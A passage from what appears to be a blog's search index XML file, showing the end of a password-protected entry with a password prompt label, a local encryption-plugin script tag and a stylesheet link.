hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
